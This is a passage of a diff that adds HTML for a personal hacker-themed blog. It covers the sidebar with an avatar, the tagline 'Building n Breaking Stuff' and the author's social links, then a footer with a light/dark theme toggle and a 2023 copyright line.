+        </div>
+        <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="pane-separator visible-xs" style="margin-bottom:5em;"></div>
+          <div class="right-pane" style="margin-left: 1em;">
+            
+              <div class="avatar">
+                <center>
+                  
+                    <img src="/potato-hacker-theme/assets/img/avatar.jpg" alt="me" class="avatar-image">
+                  
+                  
+                    <p class="avatar-description">Building n Breaking Stuff</p>
+                  
+                  <div class="right-links">
+                    
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+                  </div>
+                </center>
+              </div>
+            
+            
+              <div class="posts-list">
+                <a href="/potato-hacker-theme/blog">
+                  <h4>Recent Posts:</h4>
+                </a>
+                <ul>
+                  
+                </ul>
+              </div>
+            
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="footer">
+      <footer class="page-footer">
+  <center>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        <a onclick="toggleTheme();">
+          Light/Dark
+        </a>
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        Copyright (c) 2023 Surya -
+        <a href="mailto:d4r3d3v1l.asp@gmail.com">&lt;d4r3d3v1l.asp@gmail.com&gt;</a>
+      </div>
+    </div>
+    
+  </center>
+</footer>
+
+    </section>
+  </div>
+</body>
+
+</html>
